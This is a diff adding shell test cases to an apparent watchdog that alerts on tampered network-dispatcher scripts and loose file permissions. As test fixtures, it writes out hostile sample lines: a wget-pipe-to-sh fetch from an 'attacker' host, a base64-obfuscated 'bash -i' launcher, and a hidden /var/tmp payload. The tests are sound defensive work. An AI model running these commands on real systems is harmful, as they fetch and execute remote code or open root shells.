@@ -150,3 +150,69 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     cap | grep -q '"event":"module_lib_missing"'
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — dispatcher inventory enumerates network-event-trigger root-exec surface)" {
+    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (wget-pipe-sh in dispatcher): wget bootstrap → alert" {
+    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
+    run_wd
+    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${DISPD}/99-evil"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe in dispatcher): obfuscation → alert" {
+    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
+    run_wd
+    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${DISPD}/99-evil"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (script under /var/tmp writable root): writable-root expansion" {
+    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
+    run_wd
+    printf '#!/bin/sh\n/var/tmp/.payload --run\n' > "${DISPD}/99-evil"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (world-writable dispatcher script): script itself world-writable → alert" {
+    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
+    run_wd
+    chmod 0666 "${SCRIPT}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (group-writable dispatcher script): group-writable → alert above world-writable bar" {
+    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
+    run_wd
+    chmod 0664 "${SCRIPT}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "INVARIANT (pre-existing world-writable script): baseline_initial fires alert at install-time" {
+    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
+    chmod 0666 "${SCRIPT}"
+    run_wd
+    cap | grep -q '"event":"baseline_initial"'
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    printf '#!/bin/sh\nip route show\n' > "${SCRIPT}"
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-network-dispatcher -- ')
+    [ "${main_count}" = "1" ]
+}
